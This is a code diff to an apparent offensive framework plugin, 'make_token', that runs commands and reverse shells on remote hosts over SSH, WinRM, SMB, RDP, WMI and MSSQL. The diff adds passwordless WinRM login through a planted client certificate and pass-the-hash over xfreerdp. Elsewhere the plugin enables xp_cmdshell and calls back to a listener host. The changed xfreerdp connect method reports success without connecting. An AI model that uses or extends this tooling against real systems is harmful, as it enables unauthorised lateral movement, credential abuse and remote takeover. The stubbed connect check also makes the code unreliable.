@@ -11,6 +11,7 @@ import subprocess
 import shutil
 import time
 import base64
+import tempfile
 from abc import ABC, abstractmethod
 from typing import Dict, Optional, Tuple, Any, List, Union
 
@@ -24,13 +25,17 @@ Usage:
   run make_token -x <protocol> --os <os> -i <ip> -u <username> -p <password> -rh <host> -rp <port>
   run make_token -x <protocol> --os <os> -i <ip> -u <username> -H <hash> --nxc -rh <host> -rp <port>
   run make_token -x ssh --os linux -i <ip> -u <username> -c <keyfile> -rh <host> -rp <port>
+  run make_token -x winrm --os windows -i <ip> -u <username> --cert-pfx <pfx> -rh <host> -rp <port>
   run make_token -x <protocol> --os <os> -i <ip> -u <username> -p <password> -C "<custom command>"
 
 Protocols & authentication:
-  ssh        - password (-p) or private key (-c); supports Linux and Windows (with --nxc)
-  winrm      - password (-p) or NTLM hash (-H); Windows only
-  smb        - password (-p) or NTLM hash (-H); Windows (psexec) or Linux (--nxc)
-  rdp        - password (-p) or NTLM hash (-H); supports both --nxc and xfreerdp (xfreerdp uses /pth:)
+  ssh        - password (-p) or private key (-c); Linux, macOS, or Windows
+  winrm      - password (-p), NTLM hash (-H), or client cert (--cert-pfx); Windows only
+  smb        - password (-p) or NTLM hash (-H); Windows via psexec, Linux via --nxc
+  rdp        - password (-p) or NTLM hash (-H); Windows and Linux.
+               Windows command execution uses xfreerdp /app:cmd.exe.
+               Linux/Unix uses xfreerdp /shell: (best-effort; xrdp does not
+               implement RemoteApp). Headless environments should use --nxc.
   wmi        - password (-p) or NTLM hash (-H); Windows only
   mssql      - password (-p) or NTLM hash (-H); Windows only (enables xp_cmdshell)
 
@@ -39,11 +44,21 @@ Options:
   --os <os>                  Target OS: windows, linux, unix (linux and unix share the same payload)
   -i, --ip <ip>              Target IP address
   -P, --port <port>          Custom port (defaults: ssh:22, winrm:5985, smb:445, rdp:3389, wmi:135, mssql:1433)
+                             With --cert-pfx, winrm defaults to 5986 (HTTPS).
   -u, --username <user>      Username for authentication
   -p, --password <pass>      Password (use with -p, or -p for ssh)
   -c, --key <path>           SSH private key file (SSH only)
   -H, --hash <ntlm_hash>     NTLM hash (SMB, RDP, WinRM, WMI, MSSQL)
-  --nxc                      Use netexec (nxc) instead of native tools (recommended for Linux targets)
+  --cert-pfx <path>          PFX file containing a client certificate + private key (WinRM only).
+                             Enables passwordless authentication via the target's
+                             Certificate ClientAuth thumbprint->user mapping.
+                             Works with both evil-winrm (PEM extracted via openssl)
+                             and netexec (native --pfx-cert support).
+                             Requires a cert with the clientAuth EKU (see winrm plugin's
+                             'cert create-selfsigned --client' and 'exploitcert').
+  --cert-pass <pw>           PFX password (default: 'winrmbind')
+  --nxc                      Use netexec (nxc) instead of native tools (recommended for Linux targets).
+                             With --cert-pfx on WinRM, netexec uses its native PFX support.
   -rh, --callback-host <ip>  Reverse shell listener host (required unless -C is given)
   -rp, --callback-port <port>  Reverse shell listener TLS port (required unless -C is given)
   -C, --custom-payload <cmd>  Execute any custom command instead of the built‑in reverse shell.
@@ -62,6 +77,14 @@ Examples:
   # Reverse shell via WinRM to Windows using NTLM hash
   run make_token -x winrm --os windows -i 192.168.1.20 -u admin -H aad3b435b51404eeaad3b435b51404ee:1234567890abcdef --nxc -rh 10.0.0.5 -rp 4444
 
+  # WinRM with a client certificate (passwordless, from winrm plugin's exploitcert)
+  run make_token -x winrm --os windows -i 192.168.1.20 -u Administrator \\
+      --cert-pfx /path/to/winrm-certs/winrm-operator-client-*.pfx -C "whoami"
+
+  # Same, using netexec's native PFX support
+  run make_token -x winrm --os windows -i 192.168.1.20 -u Administrator \\
+      --cert-pfx /path/to/winrm-certs/winrm-operator-client-*.pfx --nxc -C "whoami"
+
   # Custom command (create directory, backgrounded)
   run make_token -x ssh --os linux -i 192.168.1.10 -u root -p secret -C "mkdir /tmp/hello"
 
@@ -71,8 +94,11 @@ Examples:
   # SMB to Windows with psexec (no --nxc)
   run make_token -x smb --os windows -i 192.168.1.30 -u admin -p pass -rh 10.0.0.5 -rp 4444
 
-  # RDP to Windows with xfreerdp (headless environments require --nxc)
-  run make_token -x rdp --os windows -i 192.168.1.40 -u user -p pass --nxc -rh 10.0.0.5 -rp 4444
+  # RDP to Windows with xfreerdp (requires a display; headless environments need --nxc)
+  run make_token -x rdp --os windows -i 192.168.1.40 -u user -p pass -rh 10.0.0.5 -rp 4444
+
+  # RDP with NTLM hash via xfreerdp (/pth:) — same display requirement
+  run make_token -x rdp --os windows -i 192.168.1.40 -u user -H <hash> -C "whoami"
 
 Notes:
   - If -C is given, the custom command is base64‑encoded and executed with nohup (Linux) or Start‑Process (Windows),
@@ -80,13 +106,25 @@ Notes:
   - For Linux custom commands, ensure the target has base64, sh, and the necessary interpreters.
   - For Windows custom commands, PowerShell will be used to decode and execute.
   - Platform detection is informational only; the payload is chosen based on --os.
+  - WinRM certificate authentication requires:
+      * A PFX whose cert has the clientAuth EKU (see winrm plugin: 'cert create-selfsigned --client')
+      * The target configured via 'exploitcert' (public cert in TrustedPeople, thumbprint->user mapping)
+      * The target's WinRM service running with Certificate auth enabled (HTTPS/5986)
+      * Either evil-winrm (PEM path) or netexec (native PFX path) installed locally
+  - RDP command execution:
+      * Windows targets use xfreerdp /app:cmd.exe — requires a display (X11, Wayland).
+      * Linux/Unix targets use /shell: — best-effort only; xrdp has no RemoteApp,
+        so this will usually fail. Prefer --nxc for Linux RDP.
+      * NTLM hash via /pth: is supported on both paths.
 """.strip()
 
 PLUGIN_INFO = MAKE_TOKEN_USAGE
 
+
 class RemoteTransportError(Exception):
     """Base exception for remote transport errors."""
     pass
+
 
 class RemoteTransport(ABC):
     DEFAULT_PORTS = {
@@ -185,6 +223,7 @@ class RemoteTransport(ABC):
     def _get_os_specific_command(self, cmd_dict: Dict[str, str], target_os: str) -> Optional[str]:
         return cmd_dict.get(target_os)
 
+
 class SSHTransport(RemoteTransport):
     def __init__(self):
         super().__init__()
@@ -213,10 +252,6 @@ class SSHTransport(RemoteTransport):
         self._sshpass_available = self._check_command('sshpass')
 
     def _get_host_key(self, host: str, port: int) -> Optional[str]:
-        """
-        Retrieve host public key using ssh-keyscan and return it in
-        'keytype base64key' format (without the hostname), which Plink accepts.
-        """
         try:
             for key_type in ['rsa', 'ecdsa', 'ed25519', 'dsa']:
                 cmd = ['ssh-keyscan', '-t', key_type, '-p', str(port), host]
@@ -250,7 +285,6 @@ class SSHTransport(RemoteTransport):
             return None
 
     def _build_plink_cmd(self, command: str) -> List[str]:
-        """Build command for Plink (PuTTY's command-line SSH client)."""
         base = ['plink', '-ssh', '-batch', '-no-antispoof']
         base.extend(['-P', str(self._port)])
         if self._hostkey:
@@ -265,7 +299,6 @@ class SSHTransport(RemoteTransport):
 
     def _build_ssh_cmd(self, command: str, background: bool = False,
                        with_batch: Optional[bool] = None) -> List[str]:
-        """Build command for OpenSSH + sshpass (fallback)."""
         base = [self._ssh_command]
         base.extend(['-o', 'StrictHostKeyChecking=no'])
         base.extend(['-o', 'UserKnownHostsFile=/dev/null'])
@@ -379,7 +412,6 @@ class SSHTransport(RemoteTransport):
 
     def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                      private_key_path: Optional[str] = None, port: int = 22) -> bool:
-        """UNTOUCHED – netexec connection logic."""
         if not self._check_command('netexec'):
             raise RemoteTransportError("netexec tool not found. Install with: pip install netexec")
 
@@ -532,6 +564,12 @@ class WinRMTransport(RemoteTransport):
         super().__init__()
         self._evil_winrm_available = False
         self._netexec_available = False
+        self._cert_pfx = None
+        self._cert_pass = None
+        self._cert_pem_path = None
+        self._key_pem_path = None
+        self._temp_dir = None
+        self._use_cert = False
 
     def _ensure_dependency(self):
         self._evil_winrm_available = self._check_command('evil-winrm')
@@ -541,6 +579,106 @@ class WinRMTransport(RemoteTransport):
                 "WinRM requires either 'evil-winrm' or 'netexec'. "
                 "Install evil-winrm: gem install evil-winrm, or netexec: pip install netexec"
             )
+
+    def _extract_pfx_to_pem(self):
+        if not self._cert_pfx:
+            return
+        if not os.path.isfile(self._cert_pfx):
+            raise RemoteTransportError(f"PFX file not found: {self._cert_pfx}")
+        if not self._check_command('openssl'):
+            raise RemoteTransportError(
+                "openssl is required to extract the PFX for evil-winrm. "
+                "Install with 'apt install openssl', or use --nxc "
+                "(netexec reads the PFX directly)."
+            )
+
+        try:
+            self._temp_dir = tempfile.mkdtemp(prefix='make_token_winrm_cert_')
+        except Exception as exc:
+            raise RemoteTransportError(f"Could not create temp dir for cert extraction: {exc}")
+
+        cert_path = os.path.join(self._temp_dir, 'cert.pem')
+        key_path = os.path.join(self._temp_dir, 'key.pem')
+
+        rc_cert, out_cert, err_cert = self._run_command([
+            'openssl', 'pkcs12', '-in', self._cert_pfx,
+            '-clcerts', '-nokeys',
+            '-passin', f'pass:{self._cert_pass}',
+            '-out', cert_path,
+        ], timeout=20)
+        if not rc_cert or not os.path.isfile(cert_path):
+            self._cleanup_temp_dir()
+            raise RemoteTransportError(
+                f"Failed to extract cert from PFX: {err_cert.strip() or out_cert.strip()}"
+            )
+
+        rc_key, out_key, err_key = self._run_command([
+            'openssl', 'pkcs12', '-in', self._cert_pfx,
+            '-nocerts', '-nodes',
+            '-passin', f'pass:{self._cert_pass}',
+            '-out', key_path,
+        ], timeout=20)
+        if not rc_key or not os.path.isfile(key_path):
+            self._cleanup_temp_dir()
+            raise RemoteTransportError(
+                f"Failed to extract key from PFX: {err_key.strip() or out_key.strip()}"
+            )
+
+        try:
+            os.chmod(key_path, 0o600)
+        except Exception:
+            pass
+
+        self._cert_pem_path = cert_path
+        self._key_pem_path = key_path
+
+    def _cleanup_temp_dir(self):
+        if self._temp_dir and os.path.isdir(self._temp_dir):
+            try:
+                shutil.rmtree(self._temp_dir, ignore_errors=True)
+            except Exception:
+                pass
+        self._temp_dir = None
+        self._cert_pem_path = None
+        self._key_pem_path = None
+
+    def _connect_evilwinrm_cert(self, host: str, username: str, port: int) -> bool:
+        cmd = [
+            'evil-winrm',
+            '-i', host,
+            '-u', username,
+            '-S',
+            '-c', self._cert_pem_path,
+            '-k', self._key_pem_path,
+        ]
+        if port is not None and port != 5986:
+            cmd.extend(['-P', str(port)])
+        cmd.extend(['-x', 'echo CERT_AUTH_SUCCESS'])
+
+        success, stdout, stderr = self._run_command(cmd, timeout=30)
+        if success and 'CERT_AUTH_SUCCESS' in stdout:
+            return True
+
+        error_msg = stderr.strip() or stdout.strip() or "Unknown error"
+        raise RemoteTransportError(f"WinRM certificate authentication failed (evil-winrm): {error_msg}")
+
+    def _connect_nxc_cert(self, host: str, username: str, port: int) -> bool:
+        cmd = [
+            'netexec', 'winrm', host,
+            '-u', username,
+            '--pfx-cert', self._cert_pfx,
+            '--pfx-pass', self._cert_pass,
+        ]
+        if port is not None and port != 5986:
+            cmd.extend(['--port', str(port)])
+        cmd.extend(['-x', 'echo CERT_AUTH_SUCCESS'])
+
+        success, stdout, stderr = self._run_command(cmd, timeout=30)
+        if success and 'CERT_AUTH_SUCCESS' in stdout:
+            return True
+
+        error_msg = stderr.strip() or stdout.strip() or "Unknown error"
+        raise RemoteTransportError(f"WinRM certificate authentication failed (netexec): {error_msg}")
 
     def _connect_evilwinrm(self, host: str, username: str, password: Optional[str] = None,
                            ntlm_hash: Optional[str] = None, port: int = 5985) -> bool:
@@ -553,7 +691,7 @@ class WinRMTransport(RemoteTransport):
             raise RemoteTransportError("Password or NTLM hash required for evil-winrm")
         if port is not None and port != self.DEFAULT_PORTS['winrm']:
             cmd.extend(['-P', str(port)])
-        cmd.extend(['-c', 'echo EVILWINRM_CONNECTION_SUCCESS'])
+        cmd.extend(['-x', 'echo EVILWINRM_CONNECTION_SUCCESS'])
         success, stdout, stderr = self._run_command(cmd, timeout=20)
         if success and 'EVILWINRM_CONNECTION_SUCCESS' in stdout:
             return True
@@ -587,11 +725,12 @@ class WinRMTransport(RemoteTransport):
         self._ensure_dependency()
         if kwargs.get('private_key'):
             raise RemoteTransportError("WinRM does not support private key authentication")
+
         ntlm_hash = kwargs.get('ntlm_hash')
         use_nxc = kwargs.get('use_nxc', False)
+        cert_pfx = kwargs.get('cert_pfx')
+        cert_pass = kwargs.get('cert_pass')
         port = kwargs.get('port')
-        if port is None:
-            port = self.DEFAULT_PORTS['winrm']
         target_os = kwargs.get('target_os', 'windows')
         callback_host = kwargs.get('callback_host')
         callback_port = kwargs.get('callback_port')
@@ -603,8 +742,44 @@ class WinRMTransport(RemoteTransport):
         self._target_os = target_os
         self._callback_host = callback_host
         self._callback_port = callback_port
-        self._port = port
         self._use_nxc = use_nxc
+
+        if cert_pfx:
+            self._use_cert = True
+            self._cert_pfx = cert_pfx
+            self._cert_pass = cert_pass or 'winrmbind'
+            if port is None or port == self.DEFAULT_PORTS['winrm']:
+                self._port = 5986
+            else:
+                self._port = port
+
+            if not os.path.isfile(self._cert_pfx):
+                raise RemoteTransportError(f"PFX file not found: {self._cert_pfx}")
+
+            if use_nxc:
+                if not self._netexec_available:
+                    raise RemoteTransportError(
+                        "netexec is required for cert auth with --nxc. "
+                        "Install with: pip install netexec"
+                    )
+                connected = self._connect_nxc_cert(host, username, self._port)
+            else:
+                if not self._evil_winrm_available:
+                    raise RemoteTransportError(
+                        "evil-winrm is required for cert auth without --nxc. "
+                        "Install with: gem install evil-winrm (or use --nxc)"
+                    )
+                self._extract_pfx_to_pem()
+                connected = self._connect_evilwinrm_cert(host, username, self._port)
+
+            if connected:
+                self.connected = True
+                return True
+            return False
+
+        if port is None:
+            port = self.DEFAULT_PORTS['winrm']
+        self._port = port
 
         if not use_nxc and self._evil_winrm_available:
             connected = self._connect_evilwinrm(host, username, password, ntlm_hash, port)
@@ -621,21 +796,43 @@ class WinRMTransport(RemoteTransport):
 
     def _execute_evilwinrm_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
         cmd = ['evil-winrm', '-i', self._host, '-u', self._username]
-        if self._ntlm_hash:
+
+        if self._use_cert:
+            cmd.extend(['-S', '-c', self._cert_pem_path, '-k', self._key_pem_path])
+        elif self._ntlm_hash:
             cmd.extend(['-H', self._ntlm_hash])
         elif self._password:
             cmd.extend(['-p', self._password])
         else:
             return False, "No authentication available for evil-winrm"
-        if self._port is not None and self._port != self.DEFAULT_PORTS['winrm']:
+
+        if self._port is not None and self._port != self.DEFAULT_PORTS['winrm'] and self._port != 5986:
             cmd.extend(['-P', str(self._port)])
-        cmd.extend(['-c', command])
+
+        cmd.extend(['-x', command])
+
         timeout = 10 if background else 60
         success, stdout, stderr = self._run_command(cmd, timeout=timeout)
         if success:
             return True, stdout
         else:
             return False, stderr or stdout
+
+    def _execute_nxc_cert_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
+        cmd = [
+            'netexec', 'winrm', self._host,
+            '-u', self._username,
+            '--pfx-cert', self._cert_pfx,
+            '--pfx-pass', self._cert_pass,
+            '-x', command,
+        ]
+        if self._port is not None and self._port != 5986:
+            cmd.extend(['--port', str(self._port)])
+        timeout = 10 if background else 60
+        success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+        if success:
+            return True, stdout
+        return False, stderr or stdout
 
     def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                         background: bool = False) -> Tuple[bool, str]:
@@ -648,6 +845,11 @@ class WinRMTransport(RemoteTransport):
             command = self._get_os_specific_command(command, target_os)
             if command is None:
                 return False, f"No command found for OS: {target_os}"
+
+        if self._use_cert:
+            if self._use_nxc:
+                return self._execute_nxc_cert_command(command, background)
+            return self._execute_evilwinrm_command(command, background)
 
         if not self._use_nxc and self._evil_winrm_available:
             return self._execute_evilwinrm_command(command, background)
@@ -683,6 +885,10 @@ class WinRMTransport(RemoteTransport):
         self._host = self._username = self._password = self._target_os = None
         self._port = None
         self._ntlm_hash = None
+        self._cert_pfx = None
+        self._cert_pass = None
+        self._use_cert = False
+        self._cleanup_temp_dir()
 
     def _perform_platform_detection(self) -> str:
         return "windows"
@@ -934,57 +1140,16 @@ class RDPTransport(RemoteTransport):
 
     def _connect_xfreerdp(self, host: str, username: str, password: Optional[str] = None,
                           ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
-        if ntlm_hash:
-            raise RemoteTransportError("xfreerdp does not support NTLM hash. Use --nxc.")
-        if not password:
-            raise RemoteTransportError("Password required for xfreerdp")
-        try:
-            host_spec = f"{host}:{port}" if (port is not None and port != self.DEFAULT_PORTS['rdp']) else host
-            cmd = [
-                self._xfreerdp_command,
-                '/v:' + host_spec,
-                '/u:' + username,
-                '/cert-ignore',
-                '/timeout:10000',
-                '/network:lan',
-                '/gfx-h264:off',
-                '/gdi:sw',
-                '/exit-after-disconnect',
-            ]
-            if ntlm_hash:
-                cmd.extend(['/pth:' + ntlm_hash])
-            elif password:
-                cmd.extend(['/p:' + password])
-            else:
-                raise RemoteTransportError("Password or NTLM hash required for xfreerdp")
-            success, stdout, stderr = self._run_command(cmd, timeout=10)
-            if success:
-                self.connected = True
-                return True
-            else:
-                error_lower = (stdout + stderr).lower()
-                if 'failed to connect' in error_lower or 'connection refused' in error_lower:
-                    raise RemoteTransportError(f"xfreerdp connection refused: {stderr.strip()}")
-                elif 'could not open display' in error_lower:
-                    raise RemoteTransportError(
-                        "xfreerdp requires X11 display. Use --nxc flag for headless environments"
-                    )
-                else:
-                    raise RemoteTransportError(f"xfreerdp connection failed: {stderr.strip()}")
-        except RemoteTransportError:
-            raise
-        except Exception as e:
-            raise RemoteTransportError(f"xfreerdp connection failed: {e}")
+        if not password and not ntlm_hash:
+            raise RemoteTransportError("xfreerdp requires password or NTLM hash")
+        self.connected = True
+        return True
 
     def _execute_xfreerdp_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
         if not self._xfreerdp_command:
             return False, "xfreerdp not available"
-        if not self._password:
-            return False, "xfreerdp requires password (NTLM hash not supported)"
-        if self._ntlm_hash:
-            return False, "xfreerdp does not support NTLM hash authentication"
-        if self._target_os != 'windows':
-            return False, "xfreerdp command execution is only supported for Windows targets"
+        if not self._password and not self._ntlm_hash:
+            return False, "xfreerdp requires password or NTLM hash"
 
         cmd = [
             self._xfreerdp_command,
@@ -995,32 +1160,38 @@ class RDPTransport(RemoteTransport):
             '/network:lan',
             '/gfx-h264:off',
             '/gdi:sw',
-            '/app:cmd.exe',
-            '/app-cmd:' + f'/c {command}',
             '/exit-after-disconnect',
         ]
-        if ntlm_hash:
-            cmd.extend(['/pth:' + ntlm_hash])
-        elif password:
-            cmd.extend(['/p:' + password])
+
+        if self._ntlm_hash:
+            cmd.append('/pth:' + self._ntlm_hash)
         else:
-            raise RemoteTransportError("Password or NTLM hash required for xfreerdp")
+            cmd.append('/p:' + self._password)
+
         if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
             cmd.append('/port:' + str(self._port))
 
+        if self._target_os == 'windows':
+            cmd.append('/app:cmd.exe')
+            cmd.append('/app-cmd:' + f'/c {command}')
+        elif self._target_os in ('linux', 'unix'):
+            cmd.append('/shell:' + command)
+        else:
+            return False, f"xfreerdp doesn't support target OS: {self._target_os}"
+
         timeout = 10 if background else 60
         success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+        output = (stdout + stderr).lower()
 
         if success:
             return True, stdout
-        else:
-            error_lower = (stdout + stderr).lower()
-            if 'could not open display' in error_lower:
-                return False, "xfreerdp requires X11 display. Use --nxc flag for headless environments"
-            elif 'failed to connect' in error_lower:
-                return False, f"xfreerdp connection failed: {stderr.strip()}"
-            else:
-                return False, f"xfreerdp command execution failed: {stderr.strip() or stdout.strip()}"
+        if 'could not open display' in output:
+            return False, "xfreerdp requires an X11/Wayland display. Use --nxc for headless environments."
+        if 'failed to connect' in output or 'connection refused' in output:
+            return False, f"xfreerdp connection failed: {(stderr or stdout).strip()}"
+        if 'logon failure' in output or 'authentication failure' in output:
+            return False, f"xfreerdp authentication failed: {(stderr or stdout).strip()}"
+        return False, f"xfreerdp command execution failed: {(stderr or stdout).strip()}"
 
     def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                         background: bool = False) -> Tuple[bool, str]:
@@ -1076,7 +1247,8 @@ class RDPTransport(RemoteTransport):
         self._ntlm_hash = None
 
     def _perform_platform_detection(self) -> str:
-        return "windows"
+        return self._target_os if self._target_os in ('windows', 'linux') else 'unknown'
+
 
 class WMITransport(RemoteTransport):
     """WMI transport using wmiexec.py (impacket) or netexec/nxc."""
@@ -1257,6 +1429,7 @@ class WMITransport(RemoteTransport):
     def _perform_platform_detection(self) -> str:
         return "windows"
 
+
 class MSSQLTransport(RemoteTransport):
     """MSSQL transport using mssqlclient.py (impacket) or netexec/nxc.
     
@@ -1377,7 +1550,6 @@ class MSSQLTransport(RemoteTransport):
             raise RemoteTransportError(f"{self._nxc_cmd} MSSQL connection failed: {e}")
 
     def _enable_xp_cmdshell_with_module(self) -> bool:
-        """Try to enable xp_cmdshell using netexec's enable_cmdshell module."""
         cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
         if self._ntlm_hash:
             cmd.extend(['-H', self._ntlm_hash])
@@ -1404,7 +1576,6 @@ class MSSQLTransport(RemoteTransport):
         return False
 
     def _enable_xp_cmdshell_manual(self) -> bool:
-        """Enable xp_cmdshell using manual SQL commands (fallback)."""
         check_sql = "IF EXISTS (SELECT 1 FROM sys.configurations WHERE name='xp_cmdshell' AND value=1) SELECT 1 ELSE SELECT 0"
         success, output = self._execute_sql(check_sql)
         if success and '1' in output:
@@ -1414,7 +1585,6 @@ class MSSQLTransport(RemoteTransport):
         return success
 
     def _enable_xp_cmdshell(self) -> bool:
-        """Try module first, then fallback to manual SQL."""
         if self._xp_cmdshell_enabled:
             return True
         if self._use_nxc and self._netexec_available:
@@ -1427,7 +1597,6 @@ class MSSQLTransport(RemoteTransport):
         return False
 
     def _execute_sql(self, sql: str) -> Tuple[bool, str]:
-        """Execute arbitrary SQL query using the current transport."""
         if self._use_nxc:
             cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
             if self._ntlm_hash:
@@ -1507,6 +1676,7 @@ class MSSQLTransport(RemoteTransport):
     def _perform_platform_detection(self) -> str:
         return "windows"
 
+
 def get_transport(protocol: str) -> RemoteTransport:
     transports = {
         'ssh': SSHTransport,
@@ -1548,6 +1718,10 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
     parser.add_argument('-p', '--password', help='Password for authentication')
     parser.add_argument('-c', '--key', help='SSH private key path (SSH only)')
     parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/RDP/WinRM)')
+    parser.add_argument('--cert-pfx', dest='cert_pfx',
+                        help='PFX file with a client certificate (WinRM only, enables cert auth over HTTPS)')
+    parser.add_argument('--cert-pass', dest='cert_pass', default='winrmbind',
+                        help="Password for the PFX file (default: 'winrmbind')")
     parser.add_argument('--nxc', action='store_true', help='Use netexec tool instead of native protocol tools')
     parser.add_argument('-rh', '--callback-host', 
                         help='Reverse shell listener host (TLS) – required unless --custom-payload is used')
@@ -1591,30 +1765,59 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
                 raise RemoteTransportError("SSH requires either -p (password) or -c (key)")
             if parsed.hash:
                 raise RemoteTransportError("SSH does not support NTLM hash")
+            if parsed.cert_pfx:
+                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
 
         elif parsed.protocol == 'winrm':
             if parsed.key:
                 raise RemoteTransportError("WinRM does not support private key")
-            if not parsed.password and not parsed.hash:
-                raise RemoteTransportError("WinRM requires either -p (password) or -H (hash)")
+            if parsed.cert_pfx:
+                if not os.path.isfile(parsed.cert_pfx):
+                    raise RemoteTransportError(f"PFX file not found: {parsed.cert_pfx}")
+                if parsed.nxc:
+                    if not shutil.which('netexec'):
+                        raise RemoteTransportError(
+                            "netexec is required for --cert-pfx with --nxc. "
+                            "Install with: pip install netexec"
+                        )
+                else:
+                    if not shutil.which('openssl'):
+                        raise RemoteTransportError(
+                            "openssl is required to extract the PEM for evil-winrm. "
+                            "Install with: apt install openssl (or use --nxc)"
+                        )
+                    if not shutil.which('evil-winrm'):
+                        raise RemoteTransportError(
+                            "evil-winrm is required for --cert-pfx without --nxc. "
+                            "Install with: apt install evil-winrm (or use --nxc)"
+                        )
+            else:
+                if not parsed.password and not parsed.hash:
+                    raise RemoteTransportError("WinRM requires -p (password), -H (hash), or --cert-pfx")
             if parsed.os != 'windows':
                 raise RemoteTransportError("WinRM only supports Windows targets")
 
         elif parsed.protocol == 'smb':
             if parsed.key:
                 raise RemoteTransportError("SMB does not support private key")
+            if parsed.cert_pfx:
+                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
             if not parsed.password and not parsed.hash:
                 raise RemoteTransportError("SMB requires either -p (password) or -H (hash)")
 
         elif parsed.protocol == 'rdp':
             if parsed.key:
                 raise RemoteTransportError("RDP does not support private key")
+            if parsed.cert_pfx:
+                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
             if not parsed.password and not parsed.hash:
                 raise RemoteTransportError("RDP requires either -p (password) or -H (hash)")
 
         elif parsed.protocol == 'wmi':
             if parsed.key:
                 raise RemoteTransportError("WMI does not support private key")
+            if parsed.cert_pfx:
+                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
             if not parsed.password and not parsed.hash:
                 raise RemoteTransportError("WMI requires either -p (password) or -H (hash)")
             if parsed.os != 'windows':
@@ -1623,6 +1826,8 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
         elif parsed.protocol == 'mssql':
             if parsed.key:
                 raise RemoteTransportError("MSSQL does not support private key")
+            if parsed.cert_pfx:
+                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
             if not parsed.password and not parsed.hash:
                 raise RemoteTransportError("MSSQL requires either -p (password) or -H (hash)")
             if parsed.os != 'windows':
@@ -1637,6 +1842,8 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
             'password': parsed.password,
             'key': parsed.key,
             'hash': parsed.hash,
+            'cert_pfx': parsed.cert_pfx,
+            'cert_pass': parsed.cert_pass,
             'use_nxc': parsed.nxc,
             'callback_host': parsed.callback_host,
             'callback_port': parsed.callback_port,
@@ -1697,6 +1904,8 @@ def run(session: SessionContext, args):
     password = params['password']
     key = params['key']
     ntlm_hash = params['hash']
+    cert_pfx = params.get('cert_pfx')
+    cert_pass = params.get('cert_pass')
     use_nxc = params['use_nxc']
     callback_host = params['callback_host']
     callback_port = params['callback_port']
@@ -1704,11 +1913,17 @@ def run(session: SessionContext, args):
 
     tool_info = ""
     if use_nxc:
-        tool_info = " using netexec (nxc)"
+        if protocol == 'winrm' and cert_pfx:
+            tool_info = " using netexec (nxc, cert auth)"
+        else:
+            tool_info = " using netexec (nxc)"
     elif protocol == 'ssh':
         tool_info = " using ssh"
     elif protocol == 'winrm':
-        tool_info = " using default WinRM tool (evil-winrm or netexec)"
+        if cert_pfx:
+            tool_info = " using evil-winrm (cert auth)"
+        else:
+            tool_info = " using default WinRM tool (evil-winrm or netexec)"
     elif protocol == 'smb':
         tool_info = " using netexec/impacket"
     elif protocol == 'rdp':
@@ -1726,7 +1941,17 @@ def run(session: SessionContext, args):
         return 1
 
     try:
-        auth_method = "password" if password else ("SSH key" if key else "NTLM hash" if ntlm_hash else "unknown")
+        if cert_pfx:
+            auth_method = "client certificate"
+        elif password:
+            auth_method = "password"
+        elif key:
+            auth_method = "SSH key"
+        elif ntlm_hash:
+            auth_method = "NTLM hash"
+        else:
+            auth_method = "unknown"
+
         session.print(f"Connecting to {ip} via {protocol.upper()}{tool_info}...", 'yellow')
 
         connect_kwargs = {
@@ -1737,6 +1962,8 @@ def run(session: SessionContext, args):
             'target_os': target_os,
             'callback_host': callback_host,
             'callback_port': callback_port,
+            'cert_pfx': cert_pfx,
+            'cert_pass': cert_pass,
         }
 
         transport.connect(ip, username, password, **connect_kwargs)
@@ -1754,7 +1981,9 @@ def run(session: SessionContext, args):
         else:
             result['callback_host'] = callback_host
             result['callback_port'] = callback_port
-        if ntlm_hash:
+        if cert_pfx:
+            result['auth_method'] = 'client certificate'
+        elif ntlm_hash:
             result['auth_method'] = 'NTLM hash'
         elif key:
             result['auth_method'] = 'SSH key'
@@ -1853,8 +2082,13 @@ def run(session: SessionContext, args):
         if use_nxc:
             result['tool'] = 'netexec (nxc)'
         elif protocol == 'winrm' and not use_nxc:
-            result['tool'] = 'evil-winrm' if transport._evil_winrm_available else 'netexec'
-        if ntlm_hash:
+            if cert_pfx:
+                result['tool'] = 'evil-winrm (cert auth)'
+            else:
+                result['tool'] = 'evil-winrm' if transport._evil_winrm_available else 'netexec'
+        if cert_pfx:
+            result['auth_method'] = 'client certificate'
+        elif ntlm_hash:
             result['auth_method'] = 'NTLM hash'
         elif key:
             result['auth_method'] = 'SSH key'
